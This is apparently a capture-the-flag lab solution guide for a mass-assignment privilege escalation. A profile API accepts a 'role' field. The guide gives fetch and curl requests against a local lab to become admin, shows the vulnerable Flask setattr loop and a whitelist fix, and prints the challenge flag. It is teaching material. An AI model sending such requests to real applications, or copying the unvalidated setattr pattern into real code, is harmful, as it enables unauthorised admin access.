# Broken Access Control (BAC) Lab - Solution Guide

## Vulnerability Description

This lab demonstrates a classic Broken Access Control vulnerability in the profile update functionality. The application allows users to update their profile information, but the API endpoint `/api/user/<id>` does not properly validate which fields can be updated.

While the user interface only shows and allows updating the email address, the backend API accepts changes to any user property, including the `role` field that determines administrative privileges.

## Exploitation Steps

1. **Create an account**: Register a new user account through the registration page
2. **Log in**: Use your credentials to log into the application
3. **Access profile page**: Navigate to your profile page 
4. **Inspect the code**: Check the source code of the page or open developer tools to find hints
   - There is a hidden comment with a developer note mentioning the vulnerability
   - There is also a console log message giving a hint about the API

5. **Exploit the vulnerability**: 
   - Open your browser's Developer Tools (F12)
   - Go to the Console tab and execute the following code:

```javascript
fetch(`/api/user/YOUR_USER_ID`, {
    method: 'PUT',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        email: 'your-email@example.com',
        role: 'admin'  // This is the field we're exploiting
    })
}).then(response => response.json()).then(data => console.log(data));
```

   Replace `YOUR_USER_ID` with your actual user ID (visible in the profile page URL or in network requests)

6. **Access the admin page**: After successfully updating your role to 'admin', navigate to `/admin` to retrieve the flag

## Alternative Exploitation Methods

### Using Browser Developer Tools

1. Go to the Profile page
2. Open Network tab in Developer Tools
3. Update your email (this will trigger the API call)
4. Find the request to `/api/user/<id>`
5. Right-click and select "Copy as fetch"
6. Modify the copied code to include `"role": "admin"` in the JSON body
7. Execute the modified code in the Console tab

### Using API Tools

You can also use tools like Postman or curl to send a modified request:

```bash
curl -X PUT \
  http://localhost:5000/api/user/2 \
  -H 'Content-Type: application/json' \
  -d '{
    "email": "your-email@example.com",
    "role": "admin"
}'
```

## Code Vulnerability

The vulnerability is in the `update_user` function in `app.py`:

```python
@app.route("/api/user/<int:uid>", methods=["PUT"])
def update_user(uid):
    if g.user is None or g.user.id != uid:
        abort(403)

    data = request.get_json(force=True)
    
    # VULNERABLE CODE:
    for k, v in data.items():          
        setattr(g.user, k, v)        
    
    # ...rest of the function
```

The code iterates through all key-value pairs in the JSON payload and sets attributes on the user object without any validation, allowing an attacker to modify any user attribute, including sensitive ones like `role`.

## Remediation

To fix this vulnerability, the application should implement a whitelist of allowed fields to update:

```python
@app.route("/api/user/<int:uid>", methods=["PUT"])
def update_user(uid):
    if g.user is None or g.user.id != uid:
        abort(403)

    data = request.get_json(force=True)
    
    # FIXED CODE:
    allowed_fields = ['email']  # Only allow updating email
    for k, v in data.items():
        if k in allowed_fields:  # Only update whitelisted fields
            setattr(g.user, k, v)
    
    # ...rest of the function
```

## Learning Points

1. Always implement proper access controls - validate that users can only access and modify data they are authorized to
2. Use a whitelist approach for data validation - only allow specific fields to be updated
3. Never trust client-side validation alone - always validate on the server side
4. Follow the principle of least privilege - users should only have the minimum privileges necessary

The flag for this challenge is: `flag{broken_access_control_easy}` 